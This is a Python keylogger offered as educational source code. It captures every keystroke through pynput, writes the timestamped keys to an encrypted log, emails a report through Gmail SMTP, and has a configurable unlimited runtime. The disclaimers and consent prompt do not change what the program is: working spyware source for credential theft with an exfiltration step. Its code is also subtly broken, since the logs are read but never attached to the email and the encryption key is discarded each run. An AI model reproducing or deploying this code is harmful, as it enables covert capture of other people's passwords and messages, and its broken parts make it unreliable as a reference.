"""
Keyloggers are programs that capture your keystrokes. They can be used for legitimate purposes like monitoring
employee activity (with consent) or for malicious purposes like stealing credentials.

⚠️ IMPORTANT: This program is for EDUCATIONAL PURPOSES ONLY.
Unauthorized use to monitor others without consent is ILLEGAL.

Features:
- Records keystrokes to an encrypted log file
- Sends logs via email (Gmail with app password)
- Includes timestamp for each session
- Has safety features (time limit, confirmation prompt)
- Properly handles special keys

Requirements:
- Python 3.x
- pynput (pip install pynput)
- cryptography (pip install cryptography)

Usage:
1. Set up your email credentials (see instructions below)
2. Run with: python keylogger.py
3. Press ESC to stop
"""

import smtplib
import ssl
from pynput import keyboard
from cryptography.fernet import Fernet
import time
import os
from datetime import datetime

# Configuration - REPLACE THESE VALUES
CONFIG = {
    "sender_email": "your_email@gmail.com",  # Your Gmail address
    "receiver_email": "your_email@gmail.com",  # Can be same as sender
    "email_password": "your_app_password",  # Use an App Password (not regular password)
    "max_duration": 60,  # Maximum runtime in seconds (0 for unlimited)
    "log_file": "keylog_encrypted.log"
}

# Generate encryption key (store this securely in real applications)
KEY = Fernet.generate_key()
cipher_suite = Fernet(KEY)

def show_legal_warning():
    """Display legal warning and get user confirmation"""
    print("\n" + "="*60)
    print("⚠️  LEGAL WARNING  ⚠️")
    print("This keylogger is for EDUCATIONAL PURPOSES ONLY.")
    print("Unauthorized use to monitor others is ILLEGAL in most jurisdictions.")
    print("You must have EXPLICIT CONSENT from anyone being monitored.")
    print("="*60)
    print("\nFeatures:")
    print("- Encrypted log file")
    print("- Time-limited operation")
    print("- Email notification")
    print("- Special key handling")
    print("\nUse responsibly. The creators are not responsible for misuse.")
    print("="*60)

    while True:
        response = input("\nDo you understand and accept these terms? (yes/no): ").lower()
        if response == 'yes':
            break
        elif response == 'no':
            print("Exiting...")
            exit()
        else:
            print("Please answer 'yes' or 'no'")

def get_timestamp():
    """Return formatted timestamp"""
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def write_log(text):
    """Write encrypted log to file"""
    try:
        encrypted_text = cipher_suite.encrypt(text.encode())
        with open(CONFIG["log_file"], "ab") as f:
            f.write(encrypted_text + b"\n")
    except Exception as e:
        print(f"Error writing log: {e}")

def on_press(key):
    """Handle key press events"""
    # Check duration limit
    if CONFIG["max_duration"] > 0 and (time.time() - start_time) > CONFIG["max_duration"]:
        print(f"\n⏰ Maximum duration of {CONFIG['max_duration']} seconds reached.")
        return False

    try:
        # Handle regular keys
        if hasattr(key, 'char'):
            if key.char == '\r':  # Enter key
                write_log(f"{get_timestamp()} [ENTER]")
            else:
                write_log(f"{get_timestamp()} {key.char}")
        # Handle special keys
        else:
            key_name = str(key).replace("Key.", "")
            write_log(f"{get_timestamp()} [{key_name.upper()}]")
    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key):
    """Handle key release events"""
    if key == keyboard.Key.esc:
        print("\nESC pressed - stopping keylogger...")
        return False

def send_email():
    """Send encrypted logs via email"""
    try:
        # Read and encrypt the log file
        with open(CONFIG["log_file"], "rb") as f:
            encrypted_logs = f.read()

        # Create email message
        subject = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        body = f"""Keylogger report from {time.ctime()}

⚠️ This email contains sensitive information.
The attached logs are encrypted.

Configuration used:
- Duration: {'Unlimited' if CONFIG['max_duration'] == 0 else f'{CONFIG["max_duration"]} seconds'}
- Start time: {datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')}
"""

        message = f"""From: {CONFIG['sender_email']}
To: {CONFIG['receiver_email']}
Subject: {subject}

{body}
"""

        # Send email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(CONFIG["sender_email"], CONFIG["email_password"])
            server.sendmail(CONFIG["sender_email"], CONFIG["receiver_email"], message)
            print(f"✉️ Email sent to {CONFIG['receiver_email']}")

    except Exception as e:
        print(f"❌ Failed to send email: {e}")

def cleanup():
    """Clean up resources"""
    try:
        os.remove(CONFIG["log_file"])
        print(f"Deleted log file: {CONFIG['log_file']}")
    except:
        pass

if __name__ == "__main__":
    # Show warning and get confirmation
    show_legal_warning()

    # Initialize
    start_time = time.time()
    print(f"\n🚀 Starting keylogger at {get_timestamp()}")
    print(f"Log file: {CONFIG['log_file']}")
    print(f"Maximum duration: {'Unlimited' if CONFIG['max_duration'] == 0 else f'{CONFIG["max_duration"]} seconds'}")
    print("Press ESC to stop manually...\n")

    # Start keylogger
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Error in keylogger: {e}")
    finally:
        # Send email and clean up
        if os.path.exists(CONFIG["log_file"]):
            send_email()
        cleanup()
        print("\nKeylogger stopped.")
